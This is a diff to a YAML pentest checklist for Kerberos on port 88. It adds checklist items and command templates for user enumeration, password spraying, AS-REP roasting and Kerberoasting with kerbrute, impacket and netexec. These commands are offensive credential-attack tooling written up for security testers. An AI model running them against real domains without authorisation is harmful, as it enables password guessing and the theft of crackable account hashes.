@@ -16,13 +16,27 @@ checks:
     label: "Enumerated valid usernames via kerbrute"
   - key: kerberos-asreproast
     label: "Tested AS-REP roasting on enumerated users"
+  - key: kerberos-kerberoast
+    label: "Performed Kerberoasting (GetUserSPNs) once authenticated"
+  - key: kerberos-password-spray
+    label: "Sprayed common passwords with kerbrute (lockout-aware)"
+  - key: kerberos-time-skew
+    label: "Verified host clock vs DC (max 5 min skew or auth fails)"
 commands:
   - label: "nmap Kerberos enum"
     template: "nmap -p{PORT} --script=krb5-enum-users --script-args krb5-enum-users.realm='EXAMPLE.LOCAL' {IP}"
   - label: "kerbrute userenum"
     template: "kerbrute userenum -d EXAMPLE.LOCAL --dc {IP} usernames.txt"
-  - label: "GetNPUsers (impacket)"
-    template: "impacket-GetNPUsers EXAMPLE.LOCAL/ -dc-ip {IP} -usersfile users.txt -no-pass"
+  - label: "kerbrute passwordspray (lockout safe)"
+    template: "kerbrute passwordspray -d EXAMPLE.LOCAL --dc {IP} users.txt 'Spring2025!'"
+  - label: "GetNPUsers — AS-REP roast (no creds)"
+    template: "impacket-GetNPUsers EXAMPLE.LOCAL/ -dc-ip {IP} -usersfile users.txt -no-pass -format hashcat"
+  - label: "GetUserSPNs — Kerberoast (with creds)"
+    template: "impacket-GetUserSPNs EXAMPLE.LOCAL/<user>:<pass> -dc-ip {IP} -request -outputfile spns.hash"
+  - label: "netexec / nxc kerberos asreproast"
+    template: "nxc ldap {IP} -u users.txt -p '' --asreproast asrep.hash"
+  - label: "impacket-getTGT (request TGT for user)"
+    template: "impacket-getTGT EXAMPLE.LOCAL/<user>:<pass> -dc-ip {IP}"
 resources:
   - title: "88 - Pentesting Kerberos"
     url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88"
